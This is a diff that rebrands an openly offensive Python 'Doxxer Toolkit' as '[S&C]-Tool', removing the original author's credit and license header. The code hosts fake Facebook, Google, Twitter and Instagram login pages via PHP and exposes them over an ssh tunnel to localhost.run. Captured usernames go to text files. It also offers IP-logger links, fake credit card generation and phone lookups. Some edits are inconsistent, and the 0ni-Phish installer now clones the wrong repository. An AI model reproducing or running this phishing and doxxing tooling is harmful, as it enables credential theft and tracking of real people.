@@ -1,8 +1,3 @@
-# Doxxer-Toolkit by Euronymou5
-# https://twitter.com/Euronymou51
-# Discord: Euronymou5#3155
-# LICENSE: MPL-2.0 license
-
 import os
 import time
 import subprocess
@@ -15,7 +10,7 @@ from faker import Faker
 from time import sleep
 import webbrowser
 
-Version = "2.5"
+Version = "0.1"
 
 class Colores:
   red="\033[31;1m"
@@ -28,16 +23,17 @@ class Colores:
 os.system("killall php")
 os.system("clear")
 logo = Colores.red + '''
-·▄▄▄▄        ▐▄• ▄ ▐▄• ▄ ▄▄▄ .▄▄▄      ▄▄▄▄▄            ▄▄▌  ▄ •▄ ▪  ▄▄▄▄▄
-██▪ ██ ▪      █▌█▌▪ █▌█▌▪▀▄.▀·▀▄ █·    •██  ▪     ▪     ██•  █▌▄▌▪██ •██  
-▐█· ▐█▌ ▄█▀▄  ·██·  ·██· ▐▀▀▪▄▐▀▀▄      ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ▐▀▀▄·▐█· ▐█.▪
-██. ██ ▐█▌.▐▌▪▐█·█▌▪▐█·█▌▐█▄▄▌▐█•█▌     ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌▐█.█▌▐█▌ ▐█▌·
-▀▀▀▀▀•  ▀█▄▀▪•▀▀ ▀▀•▀▀ ▀▀ ▀▀▀ .▀  ▀     ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀ ·▀  ▀▀▀▀ ▀▀▀ 
+  __   ____     ___      ____   __ 
+ | _| / ___|   ( _ )    / ___| |_ |
+ | |  \___ \   / _ \/\ | |      | |
+ | |   ___) | | (_>  < | |___   | |
+ | |  |____/   \___/\/  \____|  | |
+ |__|                          |__|
                    
-                    By:  Euronymou5
+                    By:  [S&C]
                     _______________
 
-                     Version: v2.5
+                     Version: v0.1
                      _____________
 '''
 
@@ -46,7 +42,7 @@ logo = Colores.red + '''
 def sher():
   os.system("clear")
   print(logo)
-  print('\n[1] Search with Doxxer Toolkit')
+  print('\n[1] Search with [S&C]-Tool')
   print('[2] Sherlock (Program)')
   print('[3] Nexfil (Program)')
   print('[4] Basic search with socialscan')
@@ -107,11 +103,11 @@ def iplog():
   print(logo)
   print('\n[~] Enter an option..')
   print('''\n
-  [1] IPlogger.org
+  [1] Use IPlogger.org
   
-  [2] Grabify
+  [2] Use Grabify
   
-  [3] Create an IPlogger link 
+  [3] Create an IPlogger link By this Tool
   
   [00] Back to main menu
   
@@ -180,15 +176,15 @@ def iplog():
   
 def fakerr():
   print(f'''{Colores.red}\n
-  [1] Generate fake ipv4
+  [1] Generate a fake IPv4
   
-  [2] Generate fake phone number
+  [2] Generate A Fake Phone Number
   
-  [3] Generate profile of a fake person
+  [3] Generate Profile Of A Fake Person
   
   [4] Generate User-Agents
 
-  [5] Generate fake Credit card
+  [5] Generate A Fake Credit Card
     
   [00] Back to main menu
   
@@ -369,7 +365,7 @@ def emailfak():
 def phishing():
   os.system("clear")
   print(logo)
-  print('[1] Using Doxxer Toolkit phishing')
+  print('[1] Using [S&C]-Tool phishing')
   print('[2] Zphisher (Program)')
   print('[3] 0ni-Phish (Program) (Spanish only)')
   print('[00] Back to main menu')
@@ -400,15 +396,15 @@ def phishing():
        ''')
        YP = int(input('>> '))
        if YP == 1:
-         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/Facebook/usuarios.txt')
-         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/Facebook/usuarios.txt')
+         print(f'\n{Colores.azul}[~] Users will be saved in: [S&C]-Tool/.pages/Facebook/usuarios.txt')
+         print(f'\n{Colores.verde}[~] You can see them with the command: cat [S&C]-Tool/.pages/Facebook/usuarios.txt')
          print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
          cmd = "php -t .pages/Facebook -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 2:
-         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/Google/usuarios.txt')
+         print(f'\n{Colores.azul}[~] Users will be saved in: [S&C]-Tool/.pages/Google/usuarios.txt')
          print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/Google/usuarios.txt')
          print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
@@ -416,7 +412,7 @@ def phishing():
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 3:
-         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/Twitter/usuarios.txt')
+         print(f'\n{Colores.azul}[~] Users will be saved in: [S&C]-Tool/.pages/Twitter/usuarios.txt')
          print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/Twitter/usuarios.txt')
          print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
@@ -424,7 +420,7 @@ def phishing():
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 4:
-        print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/Instagram/usuarios.txt')
+        print(f'\n{Colores.azul}[~] Users will be saved in: [S&C]-Tool/.pages/Instagram/usuarios.txt')
         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/Instagram/usuarios.txt')
         print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
         print(' ')
@@ -451,7 +447,7 @@ def phishing():
        ''')
        YP = int(input('>> '))
        if YP == 1:
-         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/en_pages/facebook/usernames.txt')
+         print(f'\n{Colores.azul}[~] Users will be saved in: [S&C]-Tool/.pages/en_pages/facebook/usernames.txt')
          print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/en_pages/facebook/usernames.txt')
          print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
@@ -459,7 +455,7 @@ def phishing():
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 2:
-         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/en_pages/google_new/usernames.txt')
+         print(f'\n{Colores.azul}[~] Users will be saved in: [S&C]-Tool/.pages/en_pages/google_new/usernames.txt')
          print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/en_pages/google_new/usernames.txt')
          print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
@@ -467,7 +463,7 @@ def phishing():
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 3:
-         print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/en_pages/twitter/usernames.txt')
+         print(f'\n{Colores.azul}[~] Users will be saved in: [S&C]-Tool/.pages/en_pages/twitter/usernames.txt')
          print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/en_pages/twitter/usernames.txt')
          print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
          print(' ')
@@ -475,7 +471,7 @@ def phishing():
          p = subprocess.Popen(cmd, shell=True)
          a = p.communicate()[0]
        elif YP == 4:
-        print(f'\n{Colores.azul}[~] Users will be saved in: Doxxer-Toolkit/.pages/en_pages/instagram/usernames.txt')
+        print(f'\n{Colores.azul}[~] Users will be saved in: [S&C]-Tool/.pages/en_pages/instagram/usernames.txt')
         print(f'\n{Colores.verde}[~] You can see them with the command: cat Doxxer-Toolkit/.pages/en_pages/instagram/usernames.txt')
         print(f'\n{Colores.magenta}[~] To exit press CTRL + C')
         print(' ')
@@ -510,7 +506,7 @@ def phishing():
        var = input('[?] You want to install 0ni-Phish [Y/n]: ')
        if var == "Y" or var == "y":
           print('\n[~] Instalando 0ni-Phish...')
-          os.system("cd .tools && git clone https://github.com/Euronymou5/0ni-Phish")
+          os.system("cd .tools && git clone https://github.com/Euronymou5/Doxxer-Toolkit.git")
           print('[~] 0ni-Phish installed.')
           time.sleep(2)
           phishing()
@@ -603,7 +599,7 @@ def numero():
            print('\n[!] The phone number is not valid!')
          else:
            print('\n[~] Phone number: ', data['number'])
-           print('[~] Country code: ', data['country_code'])
+           print('[~] Country Code: ', data['country_code'])
            print('[~] Country Name: ', data['country_name'])
            print('[~] Location: ', data['location'])
            print('[~] Carrier: ', data['carrier'])
@@ -614,9 +610,9 @@ def numero():
              if data1['valid'] == False:
                print('\n[!] The phone number is not valid!')
              else:
-               print('\n[~] Phone number: ', data1['number'])
-               print('[~] Country code: ', data1['country_code'])
-               print('[~] Country name: ', data1['country_name'])
+               print('\n[~] Phone Number: ', data1['number'])
+               print('[~] Country Code: ', data1['country_code'])
+               print('[~] Country Name: ', data1['country_name'])
                print('[~] Location: ', data1['location'])
                print('[~] Carrier: ', data1['carrier'])
            except KeyError:
@@ -638,9 +634,9 @@ def numero():
                    if data4['valid'] == False:
                       print('\n[!] The phone number is not valid!')
                    else:
-                    print('\n[~] Phone number: ', data4['number'])
-                    print('[~] Country code: ', data4['country_code'])
-                    print('[~] Country name: ', data4['country_name'])
+                    print('\n[~] Phone Number: ', data4['number'])
+                    print('[~] Country Code: ', data4['country_code'])
+                    print('[~] Country Name: ', data4['country_name'])
                     print('[~] Location: ', data4['location'])
                     print('[~] Carrier: ', data4['carrier'])
                  except KeyError:
@@ -650,9 +646,9 @@ def numero():
                      if data5['valid'] == False:
                         print('\n[!] The phone number is not valid!')
                      else:
-                        print('\n[~] Phone number: ', data5['number'])
-                        print('[~] Country code: ', data5['country_code'])
-                        print('[~] Country name: ', data5['country_name'])
+                        print('\n[~] Phone Number: ', data5['number'])
+                        print('[~] Country Code: ', data5['country_code'])
+                        print('[~] Country Name: ', data5['country_name'])
                         print('[~] Location: ', data5['location'])
                         print('[~] Carrier: ', data5['carrier'])
                    except KeyError:
@@ -661,7 +657,7 @@ def numero():
                       menu()
     elif var == 3:
        print('\n[~] Example: +19087654321')
-       phone_number = str(input('[~] Enter the phone number: '))
+       phone_number = str(input('[~] Enter The Phone Number: '))
        try:
            import phonenumbers
            from phonenumbers import geocoder, carrier, timezone
@@ -908,7 +904,7 @@ def menu():
     print(logo)
     print('''\n
     
-    [~] Welcome to Doxxer Toolkit!
+    [~] Welcome To [S&C]-Tool!
                       
     [1] IPloggers      
     [2] Geolocate IP           
